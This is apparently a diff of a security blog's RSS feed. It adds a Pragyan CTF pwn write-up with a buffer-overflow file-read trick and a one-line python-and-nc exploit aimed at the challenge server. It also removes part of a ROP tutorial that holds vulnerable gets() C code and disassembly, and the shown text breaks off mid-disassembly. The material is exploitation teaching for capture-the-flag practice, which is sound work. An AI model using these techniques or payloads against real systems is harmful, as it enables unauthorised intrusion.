@@ -7,6 +7,110 @@
 		<atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
 		
 			<item>
+				<title>[Write-Up] Pragyan CTF - Old school hack</title>
+				<description>&lt;p&gt;&lt;strong&gt;Points:&lt;/strong&gt; 200 &lt;strong&gt;Category:&lt;/strong&gt; Pwn &lt;strong&gt;Description:&lt;/strong&gt;  Chris is trying out to be a police officer and the applications have just been sent into the police academy. He is really eager to find out about his competition. Help it him back the system and view the other applicant’s applications.&lt;/p&gt;
+
+&lt;h1 id=&quot;surroundings&quot;&gt;Surroundings&lt;/h1&gt;
+&lt;p&gt;This week-end took place the &lt;a href=&quot;https://www.pragyan.org/18/home/&quot;&gt;Pragyan CTF&lt;/a&gt;. This Write-Up is going to show you how to solve the “Old school hack” pwnable challenges. This challenge was interesting because it was a mix between a wargame challenge and a classic exploit.&lt;/p&gt;
+
+&lt;h1 id=&quot;challenge&quot;&gt;Challenge&lt;/h1&gt;
+&lt;p&gt;This challenge is provided with a binary and an pair of IP/port. After a quick test, the binary is running into the given server.&lt;/p&gt;
+
+&lt;p&gt;Let first begin by recover many informations of our binary:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/pragyan_infos.png&quot; alt=&quot;Check_binary&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can get the following informations:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;The binary is an ELF, compiled for x86_64 architecture,&lt;/li&gt;
+  &lt;li&gt;It is linked dynamically,&lt;/li&gt;
+  &lt;li&gt;It is not stripped,&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The following protections are enabled:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Partial REad onLy RelOcation,&lt;/li&gt;
+  &lt;li&gt;Stack smash protection (canary),&lt;/li&gt;
+  &lt;li&gt;No eXec stack.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Let’s try to execute it now:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/pragyan_first_try.png&quot; alt=&quot;First try&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The binary start by asking a password. Using ltrace command, we can find the password: kaiokenx20&lt;/p&gt;
+
+&lt;p&gt;Now let’s taking a look at the assembly code using IDA:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/pragyan_first_ida.png&quot; alt=&quot;First ida&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The last image represent the main() function. We can see two important informations:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;The service password is well the one we get using ltrace,&lt;/li&gt;
+  &lt;li&gt;There is a buffer overflow at the call of scanf().&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;We can’t exploit the buffer overflow because the binary has canary and so on we are going to have a stack smash error if we overflow it.&lt;/p&gt;
+
+&lt;p&gt;But as you can see on the last image, we can overflow some data which are one the stack using our buffer overflow. Especially we can overwrite the “var_30” of the stack which represent the name of a file which is going to be read later by the binary.&lt;/p&gt;
+
+&lt;p&gt;Using this vulnerability, we are able to read every file that we know the name. But before being able to do this, we have several condition to bypass:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Firstly, we don’t know the name of the file which contain our flag.&lt;/li&gt;
+  &lt;li&gt;Secondly, we are going to see that the data that we overwrite are overwrite later by the binary.&lt;/li&gt;
+  &lt;li&gt;Thirdly, the filename must has a size equal to 36.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;But all this condition are easy to bypass! :)&lt;/p&gt;
+
+&lt;p&gt;The first one:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/pragyan_first_condition.png&quot; alt=&quot;First condition&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see on the last image, the binary display some text on its output which represent different entry of a menu, then ask for a number on its input and then it jump to a piece of code depending of the user input. (Like a switch statement in C language) Every piece of code overwrite the filename we write using our buffer overflow so we must not enter in this function. The switch has a default value, if the user input doesn’t match with a number between the value ‘1’ and ‘7’ the binary jump to next step without overwriting our filename!&lt;/p&gt;
+
+&lt;p&gt;So we just have to enter a value which respect this conditon: value &amp;gt;= 8&lt;/p&gt;
+
+&lt;p&gt;It’s ok for the first step.&lt;/p&gt;
+
+&lt;p&gt;Now the second step is very easy. If we check the assembly code, we can see the following:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/pragyan_second_condition.png&quot; alt=&quot;Second condition&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If the user enter 7 for the menu entry, the binary set the filename to “txt.galf” (which is flag.txt in reverse) then display something on the output and finish by a call to exit().&lt;/p&gt;
+
+&lt;p&gt;Let’s try to used “flag.txt” as filename.&lt;/p&gt;
+
+&lt;p&gt;But before getting the flag, we have a last condition to fulfill:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/pragyan_third_condition.png&quot; alt=&quot;Third condition&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The last image represent the beginning of the function which display the content of the filename we overwrite. As you can see, there is a comparaison between the size of our filename. If our filename doesn’t has a size equal to 36 bytes, the binary raise an error.&lt;/p&gt;
+
+&lt;p&gt;As our filename “flag.txt” only has a size of 8 bytes, we have a problem….&lt;/p&gt;
+
+&lt;p&gt;But we can simply bypass it using the “./” path which represent the current directory on a Linux system.&lt;/p&gt;
+
+&lt;p&gt;So our filename is going to look like this: ././././././././././././././flag.txt&lt;/p&gt;
+
+&lt;p&gt;Here is the very little “exploit” (aka command) I used to solve this challenge:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/sh&lt;/span&gt;
+python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'print &quot;kaiokenx20\x00&quot;+&quot;A&quot;*5+&quot;././././././././././././././flag.txt\x00\n&quot;+&quot;123&quot;'&lt;/span&gt;|nc 128.199.224.175 13000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now let’s try it:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/media/pragyan_flag.png&quot; alt=&quot;Done&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Done.&lt;/p&gt;
+</description>
+				<pubDate>Sun, 04 Mar 2018 00:00:00 +0000</pubDate>
+				<link>/write-up/2018/03/04/write_up_pragyan.html</link>
+				<guid isPermaLink="true">/write-up/2018/03/04/write_up_pragyan.html</guid>
+			</item>
+		
+			<item>
 				<title>[Write-Up] Codegate 2018 preliminary CTF / SharifCTF 8</title>
 				<description>&lt;h1 id=&quot;surroundings&quot;&gt;Surroundings&lt;/h1&gt;
 &lt;p&gt;This week-end took place the &lt;a href=&quot;https://quals.codegate.kr&quot;&gt;Codegate preliminary&lt;/a&gt; and the &lt;a href=&quot;http://ctf.sharif.edu&quot;&gt;Sharif&lt;/a&gt; CTF. This Write-Up is going to show you how to solve the first pwnable challenges of both CTF. Both challenges must be solved using the Return Oriented Programming technique but for the Codegate one, the binary is provided without having access to the LibC compare to the Sharif one. I am going to show you two techniques to solve both challenges.&lt;/p&gt;
@@ -2128,158 +2232,6 @@ id
 				<pubDate>Sun, 29 Jan 2017 00:00:00 +0000</pubDate>
 				<link>/pwn/2017/01/29/ret_to_libc.html</link>
 				<guid isPermaLink="true">/pwn/2017/01/29/ret_to_libc.html</guid>
-			</item>
-		
-			<item>
-				<title>[ROP] Ret to Stack</title>
-				<description>&lt;p&gt;Tools:&lt;/p&gt;
-&lt;ol&gt;
-  &lt;li&gt;objdump&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;Binary protection:&lt;/p&gt;
-&lt;ol&gt;
-  &lt;li&gt;Read Only relocations&lt;/li&gt;
-  &lt;li&gt;No exec stack&lt;/li&gt;
-  &lt;li&gt;No exec heap&lt;/li&gt;
-  &lt;li&gt;ASLR&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;Compilation: Static&lt;/p&gt;
-
-&lt;p&gt;Architecture: x86_64&lt;/p&gt;
-
-&lt;p&gt;Operating System: Linux (Debian)&lt;/p&gt;
-
-&lt;h1 id=&quot;1-vulnerable-binary&quot;&gt;1. Vulnerable binary&lt;/h1&gt;
-&lt;p&gt;For this exemple, I will take the same program as my last post.&lt;/p&gt;
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
-&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;// gcc main.c -fno-stack-protector -Wl,-z,relro,-z,now,-z,noexecstack -static
-&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-
-  &lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// Never use this function !
-&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;I will show you today an other method to exploit a buffer overflow thanks to a ROP. I find this method funny because despite the “no exec stack” protection, it permit to make the stack executable and so, execute a shellcode on it.&lt;/p&gt;
-
-&lt;h1 id=&quot;2-to-begin&quot;&gt;2. To begin&lt;/h1&gt;
-&lt;p&gt;To do this exploit, we will use the “_dl_make_stack_executable” function.
-The function look like that:&lt;/p&gt;
-&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;objdump&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;_dl_make_stack_executable&amp;gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;mi&quot;&gt;000000000045&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fc30&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_dl_make_stack_executable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fc30&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e9&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x2554e9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt;        &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b5120&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_dl_pagesize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fc37&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;mi&quot;&gt;53&lt;/span&gt;                   	&lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbx&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fc38&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;89&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fb&lt;/span&gt;             	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbx&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fc3b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;07&lt;/span&gt;             	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fc3e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;89&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f7&lt;/span&gt;             	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fc41&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f7&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;df&lt;/span&gt;             	&lt;span class=&quot;k&quot;&gt;neg&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fc44&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c7&lt;/span&gt;             	&lt;span class=&quot;k&quot;&gt;and&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fc47&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;05&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;da&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;42&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;cmp&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x2542da&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;        &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b3f28&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__libc_stack_end&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fc4e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;mi&quot;&gt;75&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;                	&lt;span class=&quot;k&quot;&gt;jne&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fc6f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_dl_make_stack_executable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fc50&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;    	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;mh&quot;&gt;0x25432a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;        &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b3f80&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__stack_prot&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fc56&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;e8&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ff&lt;/span&gt;       	&lt;span class=&quot;n&quot;&gt;callq&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;431&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d70&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__mprotect&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fc5b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;mi&quot;&gt;85&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c0&lt;/span&gt;                	&lt;span class=&quot;k&quot;&gt;test&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fc5d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;mi&quot;&gt;75&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;                	&lt;span class=&quot;k&quot;&gt;jne&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fc76&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_dl_make_stack_executable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x46&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fc5f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c7&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;03&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;movq&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fc66&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;mi&quot;&gt;83&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;01&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;orl&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2554a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;        &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b5110&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_dl_stack_flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fc6d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;                   	&lt;span class=&quot;k&quot;&gt;pop&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbx&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fc6e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;c3&lt;/span&gt;                   	&lt;span class=&quot;n&quot;&gt;retq&lt;/span&gt;   
-  &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fc6f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;b8&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;       	&lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;
